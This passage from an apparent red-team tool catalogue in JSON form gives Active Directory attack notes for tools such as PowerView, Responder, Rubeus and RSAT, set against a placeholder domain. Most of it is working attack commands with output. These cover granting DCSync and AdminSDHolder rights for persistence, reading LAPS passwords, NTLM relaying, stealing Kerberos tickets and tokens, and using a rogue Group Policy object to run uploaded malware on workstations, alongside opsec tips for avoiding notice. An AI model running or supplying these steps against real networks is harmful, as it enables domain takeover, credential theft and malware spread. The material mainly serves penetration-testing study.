fl\n\ndisplayname    : LAPS\nname           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\ngpcfilesyspath : \\\\edu.evil.corp\\SysVol\\edu.evil.corp\\Policies\\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\n```\n\n## [[Domain GPOs]]\n### Resolve ObjectDN\n\nResolve Object Distinguised Name\n\n```powershell\nGet-DomainGPO -Name \"{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\" -Properties DisplayName\n\ndisplayname       \n-----------       \nPowerShell Logging\n```\n\n### Create new GPOs\n\nThis PowerView query will show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain, which can be translated via [[PowerView#Convert SID]].\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : CreateChild\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n### Link GPOs\n\n```powershell\nGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl\n\nObjectDN           : OU=Workstations,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Tier 1,OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Tier 2,OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n### WriteProperty, WriteDacl, WriteOwner\n\n#### Affecting GPOs\n\nThis query will return any GPO in the domain, where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.\n\n```powershell\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"WriteProperty|WriteDacl|WriteOwner\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126\n```\n\n[[PowerView#Convert SID]]\n\n#### Affecting user\n\nThis query will return any principal that has **GenericAll**, **WriteProperty** or **WriteDacl** on jonas.\n\n```powershell\nGet-DomainObjectAcl -Identity jonas | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select SecurityIdentifier, ActiveDirectoryRights | fl\n\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\nActiveDirectoryRights : GenericAll\n\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\nActiveDirectoryRights : GenericAll\n\nConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125\nEDU\\1st Line Support\n```\n\n#### Affecting OU\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"CN=Users,DC=edu,DC=evil,DC=corp\" | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN=Joyce Adam,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=1st Line Support,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=Developers,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=Oracle Admins,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n## [[Domain Computers]]\n\n### Machines within OU\n\n```powershell\nGet-DomainComputer | ? { $_.DistinguishedName -match \"OU=Tier 1\" } | select DnsHostName\n\ndnshostname            \n-----------            \nsrv1.edu.evil.corp\n```\n\n### Get Property of Domain Object\n\n```powershell\nGet-DomainObject -Identity wkstn2 -Properties ms-Mcs-AdmPwd\n\nms-mcs-admpwd \n------------- \npassword123.\n```\n\n## [[Domain Computers]] [[Local Administrator Password Solution (LAPS)]]\n### Search computers with property\n\nFilter: `ms-Mcs-AdmPwdExpirationTime` not null\n\n```powershell\nGet-DomainObject -SearchBase \"LDAP://DC=edu,DC=evil,DC=corp\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname\n\ndnshostname              \n-----------              \nwkstn1.edu.evil.corp\nwkstn2.edu.evil.corp\n```\n\n## [[Shares]]\n\n### Identify Shares\n\n`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to. via [[PowerView]]\n\n```powershell\nFind-DomainShare -CheckShareAccess\n\nName           Type Remark              ComputerName\n----           ---- ------              ------------\nsoftware          0                     dc-2.edu.evil.corp\n```\n\n## [[Domain Users]] [[Sensitive Files]]\n\n### Show DomainObject\n\n```powershell\nGet-DomainUser -Identity jonas -Properties ServicePrincipalName\n\nserviceprincipalname\n--------------------\nfake/NOTHING\n```\n\n\n## [[Change Domain Objects]]\n\n### Change/Clear DomainObject\n\n#### Clear DomainObject\n\n```powershell\nSet-DomainObject -Identity jonas -Clear ServicePrincipalName\n```\n\n#### Add DONT\\_REQ\\_PREAUTH flag\n\n```powershell\nGet-DomainUser -Identity jonas | ConvertFrom-UACValue\n\nName                           Value                                                     \n----                           -----                                                     NORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n\nSet-DomainObject -Identity jonas -XOR @{UserAccountControl=4194304}\n\nGet-DomainUser -Identity jonas | ConvertFrom-UACValue\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512                              \nDONT_EXPIRE_PASSWORD           65536                              \nDONT_REQ_PREAUTH               4194304\n\n# remove again (XOR is being used)\nSet-DomainObject -Identity jonas -XOR @{UserAccountControl=4194304}\n\nGet-DomainUser -Identity jonas | ConvertFrom-UACValue\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n```\n\n#### Assign rights (DCSync)\n\n`Add-DomainObjectAcl` can be used to add a new ACL to a domain object. If we have access to a domain admin account, we can grant dcsync rights to any principal in the domain (a user, group or even computer).\n\n```powershell\nAdd-DomainObjectAcl -TargetIdentity \"DC=edu,DC=evil,DC=corp\" -PrincipalIdentity john -Rights DCSync\n```\n\n#### Assign rights (AdminSDHolder)\n\nThe AdminSDHolder itself is not protected so if we modify the DACL on it, those changes will be replicated to the subsequent objects. So even if an admin see's a rogue DACL on group such as the DA's and removes it, it will just be reapplied again.\n\n```powershell\nAdd-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=edu,DC=evil,DC=corp\" -PrincipalIdentity john -Rights All\n```\n\n## [[Discretionary Access Control Lists (DACL)]] [[Change Domain Objects]]\n#### Change DomainObject (SPN)\n\n```powershell\nSet-DomainObject -Identity jonas -Set @{serviceprincipalname=\"fake/NOTHING\"}\n```\n\n## [[Domain Groups]]\n\n### Get Groups containing users outside of this domain\n\n```powershell\nGet-DomainForeignGroupMember -Domain evil.external\n\nGroupDomain             : evil.external\nGroupName               : Administrators\nGroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external\nMemberDomain            : evil.external\nMemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133\nMemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,\n                          DC=external\n```\n\nGet the group of the machine\n\n```powershell\nGet-NetLocalGroupMember -ComputerName ad.evil.external\n\nComputerName : ad.evil.external\nGroupName    : Administrators\nMemberName   : EDU\\External Admins\nIsGroup      : True\nIsDomain     : True\n```\n\nGet the users within this group to see who can access this machine\n\n```powershell\nGet-DomainGroupMember -Identity \"External Admins\" | select MemberName\n\nMemberName\n----------\njonas\n```\n\n[[PowerView#Convert SID]]\n\n### Machines that have identity assigned to a target group\n\n```powershell\nGet-DomainGPOUserLocalGroupMapping -Identity \"Jump Users\" -LocalGroup \"Remote Desktop Users\" | select -expand ComputerName\n\nsql1.evil.corp\nexch-1.evil.corp\n```\n\n## [[Local Administrator Password Solution (LAPS)]]\n\n### Get principals can read LAPS PW\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"LDAP://OU=Workstations,DC=edu,DC=evil,DC=corp\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and $_.ActiveDirectoryRights -like \"*ReadProperty*\" } | select ObjectDN, SecurityIdentifier\n\nObjectDN                                              SecurityIdentifier\n--------                                              ------------------\nOU=Workstations,DC=edu,DC=evil,DC=corp            S-1-5-21-3263068140-2042698922-2891547269-1125\nCN=wkstn1,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125\nCN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n[[PowerView#Convert SID]]\n\n## [[Constrained Delegation]]\n\n> powerpick Get-DomainComputer -TrustedToAuth powerpick Get-DomainUser -TrustedToAuth\n\n## [[One-Way (Inbound)]]\n\n```powershell\nGet-DomainTrust                     #returns all domain trusts for the current domain or a specified domain\nGet-ForestTrust                     #returns all forest trusts for the current forest or a specified forest\nGet-DomainForeignUser               #enumerates users who are in groups outside of the user's domain\nGet-DomainForeignGroupMember        #enumerates groups with users outside of the group's domain and returns each foreign member\nGet-DomainTrustMapping              #this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds\n```\n\n[POWERVIEW - MANUAL](https://powersploit.readthedocs.io/en/latest/Recon/)\n\n",
    "commands": [],
    "latest_commit": "2020-08-17T23:19:49Z"
  },
  {
    "name": "PrintSpooler",
    "phases": [
      "07. Lateral Movement",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/leechristensen/SpoolSample",
    "description": "PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface.",
    "undetected": [],
    "detected": [],
    "content": "## [[NTLM Relaying to ADCS]]\n\n\n",
    "commands": [],
    "latest_commit": "2018-10-05T22:36:05Z"
  },
  {
    "name": "Process Hacker",
    "phases": [
      "01. Initial Access",
      "04. Persistence"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/winsiderss/systeminformer",
    "description": "A free, powerful, multi-purpose tool that helps you monitor system resources, debug software and detect malware.",
    "undetected": [],
    "detected": [],
    "content": "# Process Hacker\n\n## [[DLL Sideloading]] [[COM Hijacking]]\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T18:48:51Z"
  },
  {
    "name": "Process Monitor",
    "phases": [
      "01. Initial Access",
      "04. Persistence"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows",
      "Linux"
    ],
    "source": "https://docs.microsoft.com/en-us/sysinternals/downloads/procmon",
    "description": "Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.",
    "undetected": [],
    "detected": [],
    "content": "# Process Monitor\n\n## [[COM Hijacking]]\nFind COM hijacks\n[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.\n\nDue to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:\n\n-   **RegOpenKey** operations.\n-   where the _Result_ is **NAME NOT FOUND**.\n-   and the _Path_ ends with **InprocServer32**.\n ![](/Images/Hunting-com.png)\n\nVerify that the entry does exist in HKLM, but not in HKCU.\n>Get-Item -Path \"HKLM:\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\"\n\n\n",
    "commands": [
      {
        "id": "97d6f0d7-8443-41d6-864f-81a8fa73d87c",
        "name": "Filter for DLL Hijacking CLSID",
        "description": "Filter + verify that the entry does exist in HKLM, but not in HKCU",
        "tag": "",
        "results": [],
        "cmd": "Operations = RegOpenKey\nResult = NAME NOT FOUND\nPath ENDSWITH InprocServer32\n\nGet-Item -Path \"HKLM:\\Software\\Classes\\CLSID{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\""
      },
      {
        "id": "e0a00380-bfe4-47de-aae5-b911ea654ee2",
        "name": "Filter for DLL Search-Order-Hijacking",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Path ENDSWITH .dll\nResult = NAME NOT FOUND\nProcess Name CONTAINS <processname>"
      }
    ]
  },
  {
    "name": "Prowl",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/nettitude/Prowl",
    "description": "Prowl is an email harvesting tool that scrapes Yahoo for Linkedin profiles associated to the users search terms and identifies job titles. It also identifies current job listings for the specififed organisation.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Contact details]]\n\n",
    "commands": [],
    "latest_commit": "2020-06-01T17:03:13Z"
  },
  {
    "name": "Proxifier",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://www.proxifier.com/",
    "description": "Tunnel (GUI) apps that run on Windows via SOCKS",
    "undetected": [],
    "detected": [],
    "content": "# Proxyfier\n\n## [[SOCKS Proxy]]\n#opsec You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.\n\nOpen **Proxifier**, go to **Profile > Proxy Servers** and **Add** a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-servers.png)\n\nNext, go to **Profile > Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for **adexplorer64.exe** (part of the Sysinternals Suite). When this application tries to connect to a target host within the **10.10.17.0/24** subnet (**edu.evil.corp**), it will be automatically proxied through the Cobalt Strike proxy server defined above.\n\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-rule.png)\n\nNow launch ADExplorer and connect to **10.10.17.71** (DC-2).\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/ad-connect.png)\n\nYou will then see the traffic being proxied in Proxifier, and ADExplorer connects successfully.\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/adexplorer.png)\n\n\n",
    "commands": []
  },
  {
    "name": "Proxychains",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/haad/proxychains",
    "description": "Proxies traffix through the netter",
    "undetected": [],
    "detected": [],
    "content": "# Proxychains\n\n## [[SOCKS Proxy]]\n1. Change configuration:\n   ```bash\n    nano /etc/proxychains.conf\n    - comment out the last line\n    + Socks5 127.0.0.1 8080\n    ```\n2. Use proxychains:\n    `proxychains4 nmap -sT -p- 10.0.0.0/24`\n\n\n",
    "commands": [],
    "latest_commit": "2023-04-05T10:32:16Z"
  },
  {
    "name": "Raven",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Cross platforms (GO)"
    ],
    "source": "https://github.com/0x09AL/raven",
    "description": "raven is a Linkedin information gathering tool that can be used by pentesters to gather information about an organization employees using Linkedin.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[LinkedIn]]\n\n",
    "commands": [],
    "latest_commit": "2020-05-18T20:19:24Z"
  },
  {
    "name": "RDPThief",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/0x09AL/RdpThief",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n## [[RDP]]\n\n",
    "commands": [],
    "latest_commit": "2019-11-13T14:13:52Z"
  },
  {
    "name": "recon-ng",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/lanmaster53/recon-ng",
    "description": "Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources. Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Passive Reconnaissance]]\n\n",
    "commands": [],
    "latest_commit": "2022-07-01T00:38:50Z"
  },
  {
    "name": "reg",
    "phases": [
      "03. Host Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "Windows",
    "description": "Registry query stuff",
    "undetected": [],
    "detected": [],
    "content": "\n## [[PowerShell Logging]]\n#get_powershell_logging\n'''ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n'''\n\n## [[PowerShell-Version]]\n'''ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion\n'''\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShellCore\\Transcription\n\"EnableTranscripting\"=dword:00000001\n\"OutputDirectory\"=\"c:\\windows\\temp\\pstranscripts\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n\"EnableTranscripting\"=dword:00000001\n\"OutputDirectory\"=\"c:\\windows\\temp\\pstranscripts\"",
    "commands": [
      {
        "id": "f74abf51-9446-4701-a3ab-7077a6602a88",
        "name": "PowerShell Logging",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
      },
      {
        "id": "a59f2da6-d883-4cb3-ad3e-65085418256e",
        "name": "PowerShell Versions",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion"
      },
      {
        "id": "28ffd6e0-476f-450c-a4cb-196f247d22d7",
        "name": "SafeDllSearchMode",
        "description": "If enabled, DLLs found in SYSTEM32 will be loaded instead of the local directory",
        "tag": "",
        "results": [],
        "cmd": "reg query HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode"
      }
    ]
  },
  {
    "name": "Remote Server Administration Tools (RSAT)",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "Windows additional features",
    "description": "Help administrate AD environments",
    "undetected": [],
    "detected": [],
    "content": "# Remote Server Administration Tools (RSAT)\n\nRSAT is a management component provided by Microsoft to help manage components in a domain. Since it's a legitimate management tool and often found on management workstations and servers, it can be useful to leverage without having to bring in external tooling.\n\nThe GroupPolicy module has several PowerShell cmdlets that can be used for administering GPOs, including:\n\n-   New-GPO: Create a new, empty GPO.\n-   New-GPLink: Link a GPO to a site, domain or OU.\n-   Set-GPPrefRegistryValue: Configures a Registry preference item under either Computer or User Configuration.\n-   Set-GPRegistryValue: Configures one or more registry-based policy settings under either Computer or User Configuration.\n-   Get-GPOReport: Generates a report in either XML or HTML format.\n\n## Installations\nCheck if the GroupPolicy module is installed:\n`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`.\nAs a local admin install it with:\n`Install-WindowsFeature \u2013Name GPMC`\n\n## [[Group Policy (GPO)]]\nCreate a new GPO and immediately link it to the target OU:\n\n#OPSEC The GPO will be visible in the Group Policy Management Console and other RSAT GPO tools, so make sure the name is \"convincing\".\n``````beacon\nbeacon> getuid\n[*] You are EDU\\doe\n\nbeacon> powershell New-GPO -Name \"Evil GPO\" | New-GPLink -Target \"OU=Workstations,DC=edu,DC=evil,DC=corp\"\n\nGpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22\nDisplayName : Evil GPO\nEnabled     : True\nEnforced    : False\nTarget      : OU=Workstations,DC=edu,DC=evil,DC=corp\nOrder       : 4\n``````\n\n## Distribute Malware\n1. Identify share [[PowerView#Identify Shares]] or create share [[Create Share]]\n2. Upload malware\n``````beacon\nbeacon> cd \\\\dc-2\\software\nbeacon> upload C:\\Payloads\\pivot.exe\nbeacon> ls\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n 281kb    fil     03/10/2022 13:54:10   pivot.exe\n``````\n3. Create GPO (be very carefull what you do)\n``````beacon\nbeacon> powershell Set-GPPrefRegistryValue -Name \"Evil GPO\" -Context Computer -Action Create -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"Updater\" -Value \"%COMSPEC% /b /c start /b /min \\\\dc-2\\software\\pivot.exe\" -Type ExpandString\n\nDisplayName      : Evil GPO\nDomainName       : edu.evil.corp\nOwner            : EDU\\doe\nId               : d9de5634-cc47-45b5-ae52-e7370e4a4d22\nGpoStatus        : AllSettingsEnabled\nDescription      : \nCreationTime     : 5/26/2022 2:35:02 PM\nModificationTime : 5/26/2022 2:42:08 PM\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 1, SysVol Version: 1\nWmiFilter        :\n``````\n4. Wait. Every machine will typically refresh their GPOs automatically every couple of hours.\n\n\n\n\n",
    "commands": []
  },
  {
    "name": "Responder",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/lgandx/Responder",
    "description": "Responder is an LLMNR, NBT-NS and MDNS poisoner.",
    "undetected": [],
    "detected": [],
    "content": "# Responder\n\nResponder can capture NTLMv1/v2 hashes and relaying them for authentication to other systems if SMB signing is disabled.\n\nResponder works by listening for LLMNR or NBT-NS broadcast messages, and spoofing responses to targeted hosts, resulting in intercepting hashes we can either pass (relay) to other systems or crack offline.\n\nWith its MultiRelay tool, we can relay the hashes to other machines on the LAN and provide us a MultiRelay shell. It can also be used on windows as long as SMB is disabled!\n\n## [[NTLM Relaying]]\n\n1.  Check if SMB signing with sub-tool RunFinger.py  \n    `python ./Responder/tools/RunFinger.py -i <target IP>`\n    \n2.  Set the following values in Responder.conf  \n    ```bash\n    SMB = Off\n    HTTP = Off\n    ```\n    \n3.  Start the Responder and answer to all LLMNR requests + --lm (add downgrade attack)  \n    `python ./Responder/Responder.py -I eth0 --lm`\n    \n4.  In parallel start [[Tools/MultiRelay]] | [[Tools/smbrelayx]] to use found credentials to gain access/info  \n    `python ./Responder/tools/MultiRelay.py -t <target IP> -u ALL`\n\n\n\n",
    "commands": [],
    "latest_commit": "2023-03-15T02:21:22Z"
  },
  {
    "name": "rpcclient",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://www.mankier.com/1/rpcclient",
    "description": "tool for executing client side MS-RPC functions",
    "undetected": [],
    "detected": [],
    "content": "\n## [[User enum]]\nEnumerate users present on a system\n'''\nproxychains rpcclient 10.0.1.10 -U testuser -P pw\nenumdomusers\n'''\n\nEnumerate the user\n'queryuser testuser'\n\n\nEnumerate the current users privs\n'enumprivs'\n\n\n\n",
    "commands": [
      {
        "id": "4452fd82-16b0-492c-aef1-5214ec954d8d",
        "name": "Get users on remote system",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:USERS"
        ],
        "cmd": "rpcclient 10.0.1.10 -U testuser -P pw enumdomusers",
        "requirements": {
          "tag": "SERVICE:RPC"
        }
      },
      {
        "id": "dd980c91-8f5e-4f1a-a737-96419f85fe93",
        "name": "Get user X details on remote system",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:USERS"
        ],
        "cmd": "rpcclient 10.0.1.10 -U testuser -P pw queryuser testuser",
        "requirements": {
          "tag": "SERVICE:RPC"
        }
      },
      {
        "id": "1341f02b-b373-4970-9b0c-cfffe538cb7a",
        "name": "Get current user privs",
        "description": "Enumerate the current users privs",
        "tag": "",
        "results": [
          "PRIVS"
        ],
        "cmd": "rpcclient 10.0.1.10 -U testuser -P pw enumprivs",
        "requirements": {
          "tag": "SERVICE:RPC"
        }
      }
    ]
  },
  {
    "name": "Rubeus",
    "phases": [
      "08. Credentials & User Impersonation",
      "09. AD Misconfigurations",
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/GhostPack/Rubeus",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "# Rubeus\n\n## Request TGT and inject into sacrificial process\n1. Check permissions\n``````beacon\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n``````\n2.  Ask for TGT with aes256 hash gathered via [[eKeys]] or [[LSASS dumping]] and create a new logon session\n``````beacon\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe\n\n[*] Action: Ask TGT\n[*] Showing process : False\n[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n[+] ProcessID       : 3044\n[+] LUID            : 0x85a103\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[*] Target LUID : 8757507\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n[*] Target LUID: 0x85a103\n[+] Ticket successfully imported!\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  3/4/2022 12:48:16 PM\n  EndTime               :  3/4/2022 10:48:16 PM\n  RenewTill             :  3/11/2022 12:48:16 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  aes256_cts_hmac_sha1\n  Base64(key)           :  Jr93ezQ6z+rc0/1h30UXaGxVkRLVsWSl9mG0nNeXuTU=\n``````\n3. Steal the logon session token\n``````beacon\nbeacon> steal_token 3044\n[+] Impersonated NT AUTHORITY\\SYSTEM\n\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Extract Kerberos Tickets\n1. Make sure the Service is krbtgt/domain and note down the LUID\n``````Rubeus\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe triage\n\nAction: Triage Kerberos Tickets (All Users)\n\n[*] Current LUID    : 0x3e7\n\n ------------------------------------------------------------------------------\n| LUID     | UserName                     | Service                                       | EndTime               |\n ------------------------------------------------------------------------------\n | 0x462eb | doe @ edu.evil.corp    | krbtgt/edu.evil.corp                      | 5/12/2022 12:34:03 AM |\n | 0x25ff6 | john @ edu.evil.corp  | krbtgt/edu.evil.corp                      | 5/12/2022 12:33:41 